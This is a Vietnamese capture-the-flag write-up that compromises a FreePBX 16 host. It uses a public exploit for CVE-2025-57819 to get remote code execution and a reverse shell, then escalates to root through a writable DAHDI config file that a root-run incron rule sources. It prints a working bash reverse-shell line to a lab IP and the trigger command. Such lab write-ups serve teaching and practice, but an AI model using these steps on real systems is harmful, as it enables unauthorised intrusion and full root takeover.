Trước tiên dùng nmap để quét các cổng đang mở trên máy target
![img](img/nmap.png?raw=true)

Quan sát thấy có 3 port đang mở là 22 với dịch vụ ssh, 80 http và 443 với https. Thử truy cập vào cổng 80 để xem ứng dụng web đang mở
![img](img/port80.png?raw=true)

Đây là một trang quảng lý FreePBX phiên bản 16.0.40.7 và khi tìm kiếm tôi phát hiện ở phiên bản này có một CVE là CVE-2025-57819.

Đây là một lỗ hổng nghiêm trọng (CVSS:10.0) ảnh hướng đến FreePBX một giao diện quản lý tổng đài VoIP mã nguồn mở dựa trên nền tảng Asterisk. Lỗ hổng này bắt nguồn từ việc kiểm soát đầu vào không nghiêm ngặt trong module thương mại Endpoint Manager (EPM) của FreePBX. Hệ thống đã không lọc hoặc chuẩn hóa dữ liệu do người dùng gửi lên thông qua một số tham số giao diện. Kết hợp với một lỗi xử lý nạp lớp tự động (autoloader flaw) trong kiến trúc cốt lõi của mã nguồn, hệ thống cho phép kẻ tấn công từ xa thực hiện cuộc gọi hàm mà không cần qua bất kỳ bước đăng nhập hợp lệ nào.

Kẻ tấn công gửi các yêu cầu HTTP (chẳng hạn qua phương thức GET hoặc POST đến tệp như /admin/ajax.php hoặc modular.php) để tiếp cận tiến trình xử lý backend mà không cần tài khoản. Tiếp theo.  Thông qua lỗ hổng tiêm mã, mã độc SQL chèn trực tiếp các chuỗi truy vấn vào cơ sở dữ liệu để sửa đổi thông tin hệ thống. Kẻ tấn công thường chèn một tài khoản quản trị mới vào bảng ampusers hoặc chèn các tác vụ mã hóa Base64 độc hại vào bảng quản lý lịch trình cron_jobs. Khi các tác vụ cron được hệ thống gọi tự động, các đoạn mã độc này sẽ giải mã và sinh ra một backdoor web shell.

Ở đây tôi sử dụng một mã nguồn để khai thác lỗ hổng này trên github https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE. Trước tiên tôi sử dụng công cụ này để thử với câu lệnh id
![img](img/idbytool.png?raw=true)

# user.txt
Tôi đã thực thi thành công câu lệnh này. Tiếp theo tôi sẽ thử tính năng tạo reverse shell trên công cụ này và có thể đọc được file user.txt
![img](img/reverseshell.png?raw=true)

# root.txt
Trước tiên tôi sẽ dùng công cụ linpeas để quét các thông tin trên hệ điều hành này và tôi phát hiện dịch vụ incron kèm theo đường dẫn cấu hình /etc/incron.d/. Kết quả quét cho thấy tiến trình nền incrond đang chạy với đặc quyền cao nhất hệ thống (root), đồng thời các tệp cấu hình hoặc thư mục liên quan đến dịch vụ này lại có sự tương tác chặt chẽ với người dùng asterisk
![img](img/recon.png?raw=true)

Khi kiểm tra cụ thể các quy trình giám sát hệ thống tệp bằng lệnh cat /etc/incron.d/*, chúng ta phát hiện một quy tắc đáng chú ý:
![img](img/crontab.png?raw=true)

``/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart``

Quy tắc này chỉ ra rằng, bất cứ khi nào tệp dahdi_restart được ghi dữ liệu và đóng lại (IN_CLOSE_WRITE), dịch vụ incron chạy ngầm dưới quyền root sẽ tự động thực thi kịch bản hệ thống /usr/sbin/sysadmin_dahdi_restart để khởi động lại trình điều khiển phần cứng viễn thông DAHDI. Bản thân kịch bản khởi động lại này khi vận hành bắt buộc phải nạp và đọc các thiết lập môi trường từ tệp cấu hình /etc/dahdi/init.conf.
Lỗ hổng bảo mật nghiêm trọng thực sự lộ diện khi tiến hành kiểm tra chi tiết quyền hạn của tệp cấu hình này bằng lệnh ls -la /etc/dahdi/init.conf. 
![img](img/dahdi.png?raw=true)
Kết quả trả về cho thấy tệp thuộc sở hữu của người dùng asterisk. Điều này cho phép chúng ta – với tư cách là user asterisk hiện tại – hoàn toàn có quyền chỉnh sửa hoặc chèn thêm mã độc vào cuối tệp cấu hình hệ thống.

Sau đó sử dụng lệnh printf để chèn chuỗi mã độc reverse shell vào cuối file cấu hình init này. Sau đó sử dụng lệnh touch tác động trực tiếp vào vị trí thư mục giám sát để giả lập sự kiện hoàn tất ghi tệp. Và chúng ta đã leo được lên quyền root thành công và đọc file root.txt

`printf '\nbash -i >& /dev/tcp/10.10.14.100/6666 0>&1\n' >> /etc/dahdi/init.conf`

`touch /var/spool/asterisk/sysadmin/dahdi_restart`

![img](img/root.txt.png?raw=true)
